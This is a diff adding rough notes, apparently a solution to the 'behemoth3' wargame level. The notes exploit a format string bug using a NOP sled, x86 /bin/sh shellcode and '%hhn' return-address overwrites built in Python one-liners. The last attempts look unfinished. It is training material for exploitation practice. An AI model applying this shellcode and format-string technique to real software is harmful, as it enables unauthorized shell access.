@@ -1,0 +1,23 @@
+Upon opening the gdb for behemoth3, we can see that there is a puts and fgets which leads me to belive
+there is a string format vulnerability.
+
+Upon trying %x%x%x%x we are getting leaked addresses showing that we were right.
+
+With this we should check how large our buffer is to work with. Upon some examination, we can use 199 characters
+before we overwrite the /n at the end of the bufrfer.
+
+With this knowledge, we can write a nopsled followed by our shellcode, then overwriete the return address using
+the %n technique for string format vulnerabililtes.
+
+test script python -c 'print "\x90" * (199-28) + 
+		"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69
+		\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" 
+		+ "%hhx" * (200 + 12 + 1) + "%hhn"' > /tmp/trentinput
+
+one line: python -c 'print "\x90" * (199-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "%hhx" * (200 + 12 + 1) + "%hhn"' > /tmp/trentinput
+
+
+EGG=$(python -c 'print "\x90" * (199-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+python -c 'print "%.221d%hhn%hhn"  ' > /tmp/trentinput
+
+
